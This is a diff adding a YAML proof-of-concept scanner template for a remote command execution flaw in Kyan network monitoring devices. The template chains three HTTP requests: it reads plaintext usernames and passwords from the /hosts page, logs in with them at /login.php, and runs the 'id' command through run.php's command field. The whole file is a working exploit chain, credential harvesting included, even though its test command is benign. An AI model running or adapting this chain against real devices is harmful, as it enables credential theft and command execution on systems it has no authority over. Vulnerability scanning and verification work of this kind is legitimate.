@@ -1,0 +1,49 @@
+name: yaml-poc-kyan-platform-other-CT-517528
+binding: fc497122-917c-4b72-822b-1d94c42784ab
+detail:
+    author: system_user
+    links:
+        - https://github.com/Threekiii/Awesome-POC/blob/master/网络设备漏洞/Kyan%20网络监控设备%20run.php%20远程命令执行漏洞.md
+    vulnerability:
+        id: bba2d2b7-b1ab-4a35-987c-77b5d2aa7fba
+        level: critical
+transport: http
+set:
+    r1: randomLowercase(8)
+    r2: randomLowercase(26)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /hosts
+        expression: response.status == 200 && response.body.bcontains(bytes(string("UserName=")))
+        output:
+            search: |
+                "UserName=(?P<username>.+)\\sPassword=(?P<password>.+)".bsubmatch(response.raw)
+            username: search["username"]
+            password: search["password"]
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /login.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+                Cookie: PHPSESSID={{r2}}
+            body: |
+                user={{username}}&passwd={{password}}&x=56&y=21
+            follow_redirects: true
+        expression: response.status == 200 && response.body.bcontains(bytes(string("设备管理系统")))
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /run.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+                Cookie: PHPSESSID={{r2}}
+            body: |
+                command=%09++++++id%0D%0A&textarea=++++++++++
+        expression: response.status == 200 && response.body.bcontains(bytes(string("uid=")))
+expression: r0() && r1() && r2()
